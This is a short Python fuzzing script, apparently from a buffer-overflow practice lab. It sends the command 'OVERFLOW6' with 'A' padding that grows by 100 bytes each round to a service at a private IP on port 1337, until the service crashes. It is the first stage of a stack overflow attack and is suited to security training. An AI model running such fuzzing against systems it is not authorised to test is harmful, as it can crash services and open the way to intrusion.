#! /usr/bin/python3

import socket, time, sys

IP = '192.168.56.1'
PORT = 1337

prefix = b'OVERFLOW6 '
buffer = b'A' * 100

payload = prefix + buffer

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((IP, PORT))
            print('Fuzzing with {} bytes of junk' .format(len(payload) - len(prefix))) 
            s.send(payload)
            s.recv(1024)
    except:
        print('Fuzzing crashed at {} bytes' .format(len(payload) - len(prefix)))
        sys.exit(0)
    time.sleep(1)
    payload += b"A" * 100
